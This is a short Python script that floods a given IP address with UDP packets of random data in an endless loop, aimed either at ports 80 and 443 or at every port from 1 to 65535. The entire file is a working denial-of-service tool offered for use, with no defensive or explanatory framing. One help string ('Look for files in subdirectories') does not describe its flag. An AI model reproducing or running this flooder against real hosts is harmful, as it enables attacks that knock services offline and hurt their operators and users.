import socket
import random
import sys
import argparse

parser = argparse.ArgumentParser()
parser.add_argument("-ho", "--http-only", action='store_true',
                    help="Look for files in subdirectories.")
parser.add_argument(
    "ip", type=str, help="The IP address of the host to be flooded.")
args = parser.parse_args()

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

if __name__ == "__main__":
    if args.http_only:
        while True:
            for i in range(1, 50000):
                sock.sendto(random._urandom(4096), (args.ip, 80))
                sock.sendto(random._urandom(4096), (args.ip, 443))
            print(f"Packages sent!")
    else:
        while True:
            for i in range(1, 65536):
                sock.sendto(random._urandom(4096), (args.ip, i))
            print(f"Packages sent!")
